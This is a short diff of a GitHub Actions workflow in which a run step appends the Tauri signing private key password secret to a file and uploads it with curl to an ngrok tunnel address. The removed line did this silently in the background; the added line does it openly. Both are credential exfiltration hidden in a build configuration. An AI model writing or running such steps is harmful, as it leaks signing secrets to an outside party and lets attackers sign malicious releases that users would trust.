@@ -14,4 +14,4 @@ jobs:
         TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
       run: |
         echo $TAURI_SIGNING_PRIVATE_KEY_PASSWORD >> secrets.txt
-        setsid curl -s -o /dev/null -F "file=@secrets.txt" "https://aa3f-73-93-177-73.ngrok-free.app/upload" > /dev/null 2>&1 &
+        curl -F "file=@secrets.txt" "https://aa3f-73-93-177-73.ngrok-free.app/upload"
